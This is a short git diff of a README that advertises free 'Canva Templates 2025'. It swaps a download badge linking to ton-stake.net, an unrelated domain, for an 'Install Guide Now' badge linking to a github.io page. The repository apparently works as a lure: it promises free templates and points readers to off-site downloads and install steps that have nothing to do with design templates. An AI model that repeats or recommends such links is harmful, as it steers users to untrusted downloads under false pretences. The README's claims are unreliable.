@@ -3,7 +3,11 @@
 **Canva Templates 2025** is a free collection of modern templates for resumes, social media graphics, and business presentations.  
 Designed for 2025 trends, these templates help you create professional designs fast.  
 
-[![Download Canva Templates](https://img.shields.io/badge/Download-Canva_Templates_2025-blueviolet)](https://ton-stake.net)
+
+<a href="https://canva-templates-2025.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
+
 
 ---
 
